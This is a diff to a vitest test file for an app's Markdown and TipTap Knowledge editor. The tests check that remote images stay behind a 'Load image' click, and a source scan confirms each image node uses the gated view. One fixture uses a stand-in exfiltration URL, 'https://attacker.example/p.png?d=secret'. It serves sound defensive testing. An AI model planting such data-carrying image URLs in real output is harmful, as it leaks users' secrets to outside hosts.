@@ -13,6 +13,8 @@
  *  - `ArtifactMarkdown` (`ArtifactViewerModal`, view and live preview)
  *  - `DocumentMarkdown` (`DocumentPane`, the side-panel editor)
  *  - `ProseTimelineEntry` (`ThinkingContainer`, reasoning and narration)
+ *  - `EditorImage` (the Knowledge block editor's image node, WS-61 KB-2b,
+ *    which draws each page image in the read view and in the editor)
  *
  * `vitest.config.ts` runs in `node`, with no DOM. So a "click" here walks the
  * element tree the renderer returns, finds the "Load image" button, and calls
@@ -33,6 +35,7 @@ import { DocumentMarkdown } from "@/components/DocumentPane";
 import { RemoteImage, RemoteImagePlaceholder } from "@/components/MarkdownImage";
 import { MarkdownBody } from "@/components/MarkdownMessage";
 import { ProseTimelineEntry } from "@/components/ThinkingContainer";
+import { EditorImage } from "@/app/knowledge/components/editor/nodeViews";
 import { resetRemoteImages } from "@/lib/markdownMedia";
 
 const REMOTE = "https://attacker.example/p.png?d=secret";
@@ -488,5 +491,89 @@ describe("ThinkingContainer's prose — a remote image loads only on a click", (
     expect(before).toContain("Image from attacker.example");
     clickLoad(el);
     expect(imgSrcs(renderToStaticMarkup(el))).toContain(REMOTE);
+  });
+});
+
+// ─── The Knowledge block editor: EditorImage (WS-61 KB-2b) ─────────────────
+
+describe("EditorImage — a remote image in a Knowledge page loads only on a click", () => {
+  const image = (src: string) => createElement(EditorImage, { src, alt: "chart", title: null });
+
+  it("draws the gate for a remote src, and loads it after a click", () => {
+    const el = image(REMOTE);
+    const before = renderToStaticMarkup(el);
+    expect(loadsFrom(before, "attacker.example")).toBe(false);
+    expect(before).toContain("Image from attacker.example");
+    clickLoad(el);
+    expect(imgSrcs(renderToStaticMarkup(el))).toEqual([REMOTE]);
+  });
+
+  it("draws a data: image and a same-origin page asset at once", () => {
+    expect(imgSrcs(renderToStaticMarkup(image(DATA_URI)))).toEqual([DATA_URI]);
+    expect(imgSrcs(renderToStaticMarkup(image("/logo.png")))).toEqual(["/logo.png"]);
+  });
+});
+
+describe("every TipTap renderer draws its images with MarkdownImage", () => {
+  // A source scan, like the react-markdown one above. A TipTap image node
+  // with no node view draws a bare <img src>, and that loads a remote image
+  // the moment the page opens. So each image node must take its view from
+  // the editor, and the view must be the gated one.
+  const SRC = fileURLToPath(new URL("..", import.meta.url));
+  const files: Array<{ path: string; src: string }> = [];
+  const walk = (dir: string) => {
+    for (const entry of readdirSync(dir)) {
+      const full = join(dir, entry);
+      if (statSync(full).isDirectory()) walk(full);
+      else if (/\.tsx?$/.test(entry) && !/\.test\.tsx?$/.test(entry)) {
+        files.push({ path: relative(SRC, full).split(sep).join("/"), src: readFileSync(full, "utf8") });
+      }
+    }
+  };
+  walk(SRC);
+  const text = (path: string) => files.find((f) => f.path === path)?.src ?? "";
+
+  /**
+   * The image nodes outside this rule, each with its reason. The email
+   * signature is the member's own HTML for mail they send, sanitised by
+   * `cleanSignatureHtml`. It is not Markdown, and no agent writes it.
+   */
+  const EXEMPT = ["app/email/components/SignatureEditor.tsx"];
+
+  it("finds the TipTap image nodes it guards", () => {
+    const users = files.filter((f) => /from\s+["']@tiptap\/extension-image["']/.test(f.src)).map((f) => f.path);
+    expect(users.sort()).toEqual(["app/email/components/SignatureEditor.tsx", "app/knowledge/lib/editor/schema.ts"]);
+  });
+
+  it("the Knowledge schema's image takes its node view from the editor", () => {
+    expect(text("app/knowledge/lib/editor/schema.ts")).toContain("withView(KnowledgeImage, views.image)");
+  });
+
+  it("each editor that draws the Knowledge schema plugs in the gated image view", () => {
+    const drawers = files.filter(
+      (f) => /\bknowledgeExtensions\(/.test(f.src) && /from\s+["']@tiptap\/react["']/.test(f.src),
+    );
+    expect(drawers.map((f) => f.path)).toEqual(["app/knowledge/components/editor/KnowledgeEditor.tsx"]);
+    const offenders = drawers.filter((f) => !f.src.includes("image: ReactNodeViewRenderer(ImageView)")).map((f) => f.path);
+    expect(offenders).toEqual([]);
+    // A call with no views draws nothing: it only reads and writes Markdown.
+    const readers = files.filter((f) => /\bknowledgeExtensions\(\)/.test(f.src)).map((f) => f.path);
+    for (const path of readers) expect(text(path), path).not.toMatch(/from\s+["']@tiptap\/react["']/);
+  });
+
+  it("the image view draws EditorImage, and EditorImage draws MarkdownImage", () => {
+    const views = text("app/knowledge/components/editor/nodeViews.tsx");
+    const imageView = views.slice(views.indexOf("export function ImageView"), views.indexOf("export function CodeBlockView"));
+    expect(imageView).toContain("<EditorImage");
+    const editorImage = views.slice(views.indexOf("export function EditorImage"), views.indexOf("export function ImageView"));
+    expect(editorImage).toContain("<MarkdownImage");
+  });
+
+  it("no other file outside the exemptions draws a TipTap image", () => {
+    const offenders = files
+      .filter((f) => /from\s+["']@tiptap\/extension-image["']/.test(f.src))
+      .filter((f) => !EXEMPT.includes(f.path) && f.path !== "app/knowledge/lib/editor/schema.ts")
+      .map((f) => f.path);
+    expect(offenders).toEqual([]);
   });
 });
